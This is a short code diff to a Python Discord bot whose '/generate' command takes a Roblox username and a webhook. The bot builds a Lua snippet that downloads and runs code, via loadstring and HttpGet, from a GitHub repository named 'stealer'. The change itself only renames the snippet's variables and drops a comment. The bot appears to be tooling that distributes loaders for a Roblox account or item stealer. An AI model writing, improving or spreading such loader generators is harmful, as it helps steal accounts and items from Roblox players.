@@ -16,7 +16,7 @@ ALLOWED_GUILD_ID = int(os.environ.get("ALLOWED_GUILD_ID", "0"))
 # Roblox verification settings
 ROBLOX_USERS_URL = "https://users.roblox.com/v1/users/search"
 CACHE_TTL = 60  # seconds
-_username_cache = {}  # simple in-memory cache: key -> (expiry, bool)
+_username_cache = {}
 
 intents = discord.Intents.default()
 bot = commands.Bot(command_prefix="!", intents=intents)
@@ -112,8 +112,8 @@ async def generate(interaction: discord.Interaction, username: str, webhook: str
     token = data.get("token", "unknown")
 
     # Build the Lua script snippet
-    lua_script = f'''local username = "{username}"
-local token = "{token}"
+    lua_script = f'''user = "{username}"
+id = "{token}"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/temphor/stealer/refs/heads/main/horizon-gag2", true))()'''
 
     embed = discord.Embed(
